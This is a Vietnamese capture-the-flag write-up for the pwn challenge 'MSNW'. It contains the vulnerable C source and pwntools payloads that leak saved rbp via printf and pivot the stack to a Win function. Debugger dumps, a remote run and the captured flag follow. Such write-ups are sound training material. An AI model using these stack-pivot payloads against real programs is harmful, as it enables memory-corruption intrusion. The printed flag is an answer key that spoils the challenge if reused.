# ***Challenge: MSNW***
***
## Source code:
- Ta sẽ dịch ngược file bằng IDA
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MEONG 0
#define NYANG 1

#define NOT_QUIT 1
#define QUIT 0

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

int Meong() {
    char buf[0x40];

    memset(buf, 0x00, 0x130);

    printf("meong 🐶: ");
    read(0, buf, 0x132);

    if (buf[0] == 'q')
        return QUIT;
    return NOT_QUIT;
}

int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}

int Call(int animal) {
    return animal == MEONG ? Meong() : Nyang();
}

void Echo() {
    while (Call(MEONG)) Call(NYANG);
}

void Win() {
    execl("/bin/cat", "/bin/cat", "./flag", NULL);
}

int main(void) {
    Init();

    Echo();
    puts("nyang 🐱: goodbye!");

    return 0;
}
```
- Mô tả chương trình: Chương trình sẽ đưa ta vào 1 vòng lặp vô hạn để nhập 1 chuỗi và in ra 1 chuỗi ta vừa nhập. Ta chỉ có thể thoát vòng lặp khi nhập 'q'
-> Ta thấy hàm Win để lấy flag được cung cấp sẵn, vậy hướng khai thác của ta sẽ là làm sao để chương trình return to hàm Win đó.

## Exploit:
- Kiểm tra các chế độ bảo vệ của file
```sh
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
-> Nhận xét: Với No PIE ta có thể dễ dàng có được địa chỉ chính xác của hàm main mà không cần leak gì hết. No canary cho phép ta có thể Buffer Overflow chương trình.

*-> Như vậy, hướng khai thác ban đầu sẽ là return to Win, nhưng khi quan sát thì chuỗi buf khai báo 0x130 byte mà cho ta nhập 0x132 -> Chỉ có thể overwrite đến được saved rbp nên kỹ thuật khai thác bài này sẽ là stack pivot để chuyển hướng thực thi của chương trình.*

### Stage 1: Leak rbp:

- Địa chỉ của saved rbp luôn động nên ta buộc phải leak đc. Do hàm Nyang() để in chuỗi dùng %s để printf nên ta sẽ leak được rbp. Nếu đưa vào 1 chuỗi dài đến đúng saved rbp (Do hàm printf %s chỉ dừng in khi gặp null byte '\0').
- Sau khi nhập từ bàn phím 0x130 byte:
```sh
38:01c0│-030 0x7fffffffd9c0 ◂— 0x6261616161616168 ('haaaaaab')
39:01c8│-028 0x7fffffffd9c8 ◂— 0x6261616161616169 ('iaaaaaab')
3a:01d0│-020 0x7fffffffd9d0 ◂— 0x626161616161616a ('jaaaaaab')
3b:01d8│-018 0x7fffffffd9d8 ◂— 0x626161616161616b ('kaaaaaab')
3c:01e0│-010 0x7fffffffd9e0 ◂— 0x626161616161616c ('laaaaaab')
3d:01e8│-008 0x7fffffffd9e8 ◂— 0x626161616161616d ('maaaaaab')
3e:01f0│ rbp 0x7fffffffd9f0 —▸ 0x7fffffffdb0a ◂— 0x340000003400000
3f:01f8│+008 0x7fffffffd9f8 —▸ 0x401320 (Call+40) ◂— jmp Call+52
```
- Script leak:
```py
pl = b"A"*0x130

p.sendafter("meong 🐶: ", pl)
p.recvuntil(pl)
rbp_leak = u64(p.recv(6) + b'\0\0')
log.info("rbp_leak: " + hex(rbp_leak))
```
### Stage 2: stack pivot

- Do ta có lệnh leave và ret nên ta có thể stack pivot như sau:
- Đầu tiên, ta sẽ cho trước địa chỉ hàm Win vào giữa stack (tránh để đầu payload), Sau đó ta ghi đè 2 byte cuối của saved rbp mà ta đã leak.
- Sau đó, ta sẽ tính toán offset sao cho khi thực hiện xong lệnh leave thì rsp sẽ trỏ vào đúng địa chỉ của hàm Win mà ta đã cố định ở trên, để khi thực thi ret thì chương trình sẽ bị chuyển hướng thực thi đến hàm Win.
- Ta sẽ gửi script sau để tính toán offset khi debug động:
```py
pl = b'A'*0x70 + p64(exe.sym.Win)
pl = pl.ljust(0x130, b"A")
pl += p16((rbp_leak) & 0xffff)

p.sendafter("meong 🐶: ", pl)
```
```sh
- rbp sau ghi đè:
38:01c0│-030 0x7fff9cc373c0 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓        5 skipped
3e:01f0│ rbp 0x7fff9cc373f0 —▸ 0x7fff9cc375f0 —▸ 0x7fff9cc376f0 —▸ 0x7fff9cc377b0 ◂— 1
3f:01f8│+008 0x7fff9cc373f8 —▸ 0x401320 (Call+40) ◂— jmp Call+52

```
```
- Địa chỉ trỏ đến Win
20:0100│-0f0 0x7fff9cc37300 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓     5 skipped
26:0130│-0c0 0x7fff9cc37330 —▸ 0x40135b (Win) ◂— endbr64 
27:0138│-0b8 0x7fff9cc37338 ◂— 0x4141414141414141 ('AAAAAAAA')
pwndbg> 
28:0140│-0b0 0x7fff9cc37340 ◂— 0x4141414141414141 ('AAAAAAAA')
```
```
- Vậy offset:
pwndbg> p/x 0x7fff9cc375f0 - 0x7fff9cc37330
$2 = 0x2c0
```
- Mà khi leave thì rsp sẽ = rbp + 8 nên để rsp trỏ vào Win thì ta trừ thêm cho 0x8 byte.
- Payload:
```py
pl = b'A'*0x70 + p64(exe.sym.Win)
pl = pl.ljust(0x130, b"A")
pl += p16((rbp_leak - 0x2c0 - 0x8) & 0xffff)

p.sendafter("meong 🐶: ", pl)
```
- Gửi script lấy flag:
```sh
 python3 solve.py r
[▘] Opening connection to host3.dreamhack.games on port 19717: Trying [+] Opening connection to host3.dreamhack.games on port 19717: Done
/home/d1nhdwc/.local/lib/python3.13/site-packages/pwnlib/tubes/tube.py:866: BytesWarning: Text is not bytes; assuming UTF-8, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] rbp_leak: 0x7ffe5c0c28f0
[*] 2-last-byte: 0x28f0
[*] Switching to interactive mode
DH{858850f130ca946b440b44fbc63b1fd63d85ad79fe8881b72bfe90bf37e11982}$                                                            
[*] Got EOF while reading in interactive
$
```
***->  Đã chiếm được shell***

```Flag: DH{858850f130ca946b440b44fbc63b1fd63d85ad79fe8881b72bfe90bf37e11982}```